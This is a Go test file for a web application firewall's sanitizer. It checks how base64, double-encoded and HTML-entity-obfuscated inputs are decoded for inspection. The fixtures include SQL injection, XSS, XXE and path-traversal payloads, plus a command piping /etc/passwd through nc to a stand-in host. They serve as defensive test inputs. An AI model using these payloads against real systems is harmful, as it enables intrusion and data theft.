package sanitizer

import (
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"strings"
	"testing"

	"github.com/guardianwaf/guardianwaf/internal/engine"
)

func decodedTexts(ctx *engine.RequestContext, normalize bool) []string {
	var out []string
	for _, v := range collectDecodedViews(ctx, normalize) {
		out = append(out, v.Raw)
	}
	return out
}

func TestBase64TextIsDecoded(t *testing.T) {
	payload := "' OR 1=1 -- select * from users"
	cases := map[string]string{
		"std":       base64.StdEncoding.EncodeToString([]byte(payload)),
		"raw std":   base64.RawStdEncoding.EncodeToString([]byte(payload)),
		"url-safe":  base64.URLEncoding.EncodeToString([]byte(payload + "??>>")),
		"unpadded":  base64.RawURLEncoding.EncodeToString([]byte(payload + "~~~")),
		"html":      base64.StdEncoding.EncodeToString([]byte("<script>alert(document.cookie)</script>")),
		"multiline": base64.StdEncoding.EncodeToString([]byte("line one\r\nSet-Cookie: a=b")),
	}
	for name, enc := range cases {
		ctx := &engine.RequestContext{QueryParams: map[string][]string{"q": {enc}}}
		if len(decodedTexts(ctx, false)) == 0 {
			t.Errorf("%s: %q not decoded", name, enc)
		}
	}
}

func TestBase64PlusSurvivedAsSpace(t *testing.T) {
	// 0xfb 0xef 0xbe is "++++" territory; build a token whose '+' a query
	// string decoder turned into spaces.
	enc := base64.StdEncoding.EncodeToString([]byte("select name>>>from users where id>>>1"))
	if !strings.Contains(enc, "+") {
		t.Skip("fixture has no '+'")
	}
	mangled := strings.ReplaceAll(enc, "+", " ")
	ctx := &engine.RequestContext{QueryParams: map[string][]string{"q": {mangled}}}
	if len(decodedTexts(ctx, false)) == 0 {
		t.Errorf("space-for-plus token %q not decoded", mangled)
	}
}

func TestBase64EmbeddedInBodyAndPath(t *testing.T) {
	body := base64.StdEncoding.EncodeToString([]byte("<!DOCTYPE x [<!ENTITY y SYSTEM \"file:///etc/passwd\">]>"))
	path := base64.StdEncoding.EncodeToString([]byte("../../../../etc/passwd and more text"))
	ctx := &engine.RequestContext{BodyString: "<a>" + body + "</a>", Path: "/api/" + strings.ReplaceAll(path, "/", "_")}
	got := collectDecodedViews(ctx, false)
	sources := map[string]bool{}
	for _, v := range got {
		sources[v.Source] = true
	}
	if !sources["base64:body"] || !sources["base64:path"] {
		t.Errorf("sources = %v, want base64:body and base64:path", sources)
	}
}

func TestBase64DoubleEncodingFollowed(t *testing.T) {
	inner := base64.StdEncoding.EncodeToString([]byte("cat /etc/passwd | nc evil.example 9"))
	outer := base64.StdEncoding.EncodeToString([]byte(inner))
	ctx := &engine.RequestContext{QueryParams: map[string][]string{"q": {outer}}}
	joined := strings.Join(decodedTexts(ctx, false), "\n")
	if !strings.Contains(joined, "/etc/passwd") {
		t.Errorf("double-encoded payload not reached: %q", joined)
	}
}

func TestOrdinaryValuesAreNotDecoded(t *testing.T) {
	sum := sha256.Sum256([]byte("x"))
	binary := make([]byte, 48)
	_, _ = rand.Read(binary)
	values := []string{
		hex.EncodeToString(sum[:]),                                 // sha256 hex
		"550e8400-e29b-41d4-a716-446655440000",                     // uuid
		base64.StdEncoding.EncodeToString(sum[:]),                  // binary digest
		base64.URLEncoding.EncodeToString(binary),                  // random bytes
		"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9",                     // jwt header only: json, no letters-only? it decodes to json
		"a-very-long-article-slug-about-web-application-firewalls", // slug
		"the-quick-brown-fox-jumps-over-the-lazy-dog",              // slug
		"1234567890123456789012345",                                // digits
		"AAAAAAAAAAAAAAAAAAAAAAAA",                                 // padding bytes
		"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7 user@host",       // key, spaces
		"short",
	}
	for _, v := range values {
		ctx := &engine.RequestContext{QueryParams: map[string][]string{"q": {v}}}
		for _, d := range decodedTexts(ctx, false) {
			// The JWT header is genuine JSON text; everything else must not decode.
			if strings.HasPrefix(v, "eyJ") {
				continue
			}
			t.Errorf("%q decoded to %q", v, d)
		}
	}
}

func TestBase64BinaryBodyIsSkipped(t *testing.T) {
	enc := base64.StdEncoding.EncodeToString([]byte("select * from users where 1=1 -- --"))
	ctx := &engine.RequestContext{BodyString: enc, BodyBinary: true}
	if got := decodedTexts(ctx, false); len(got) != 0 {
		t.Errorf("binary body decoded: %v", got)
	}
}

func TestBase64ViewsAreBounded(t *testing.T) {
	enc := base64.StdEncoding.EncodeToString([]byte("select name from users where id=1 --"))
	q := map[string][]string{}
	for i := range 100 {
		q[strings.Repeat("k", i+1)] = []string{enc[:len(enc)-4] + base64.StdEncoding.EncodeToString([]byte{byte('a' + i%26), 'b', 'c'})}
	}
	ctx := &engine.RequestContext{QueryParams: q}
	if got := collectDecodedViews(ctx, false); len(got) > maxViews {
		t.Errorf("%d views, cap is %d", len(got), maxViews)
	}
}

func TestLayerFillsAndSkipsDecodedViews(t *testing.T) {
	enc := base64.StdEncoding.EncodeToString([]byte("' OR '1'='1' -- and more text"))
	build := func(skip bool) *engine.RequestContext {
		l := NewLayer(&Config{MaxURLLength: 8192, MaxHeaderSize: 8192, MaxHeaderCount: 100, MaxBodySize: 1 << 20, MaxCookieSize: 4096, SkipBase64Decoding: skip})
		ctx := &engine.RequestContext{Path: "/", QueryParams: map[string][]string{"q": {enc}}, Headers: map[string][]string{}}
		l.Process(ctx)
		return ctx
	}
	if got := build(false).DecodedViews; len(got) != 1 || got[0].Source != "base64:query" {
		t.Errorf("DecodedViews = %+v, want one query view", got)
	}
	if got := build(true).DecodedViews; len(got) != 0 {
		t.Errorf("decoding disabled but got %+v", got)
	}
}

func FuzzCollectDecodedViews(f *testing.F) {
	for _, s := range []string{"", "====", "AAAA", "JyBPUiAxPTEtLQ==", "a b c d e f g h i j k l m n o p"} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, s string) {
		ctx := &engine.RequestContext{QueryParams: map[string][]string{"q": {s}}, BodyString: s, Path: "/" + s}
		_ = collectDecodedViews(ctx, true)
	})
}

func TestEntityAmpersandJoinsQueryString(t *testing.T) {
	cases := map[string]bool{
		"/?a=%3Csvg/onload&equals;alert(1)&gt;":   true,
		"/?a=<IMG SRC=j&#X41vascript:alert(1)>":   true,
		"/?a=1&b=2":                               false,
		"/?select=id,name&from=2020&where=active": false,
		"/?q=Tom&Jerry":                           false,
		"/?q=fish%26chips":                        false,
		"/?q=a&b;c":                               false, // one letter before ';'
		"/?x=%26lt%3Bscript%26gt%3B":              true,  // &lt;script&gt; once decoded
		"/?q=R&D;":                                false,
	}
	for uri, want := range cases {
		ctx := &engine.RequestContext{URI: uri}
		got := false
		for _, v := range collectDecodedViews(ctx, true) {
			if v.Source == "query-string" {
				got = true
			}
		}
		if got != want {
			t.Errorf("%q: query-string view = %v, want %v", uri, got, want)
		}
	}
}

func TestEntityAmpersandJoinsFormBody(t *testing.T) {
	ctx := &engine.RequestContext{
		ContentType: "application/x-www-form-urlencoded",
		BodyString:  "a=%3Cimg%20src=x%20onerror&equals;alert(1)%3E",
	}
	var got bool
	for _, v := range collectDecodedViews(ctx, true) {
		got = got || v.Source == "body-string"
	}
	if !got {
		t.Error("form body with an entity ampersand was not joined")
	}
}
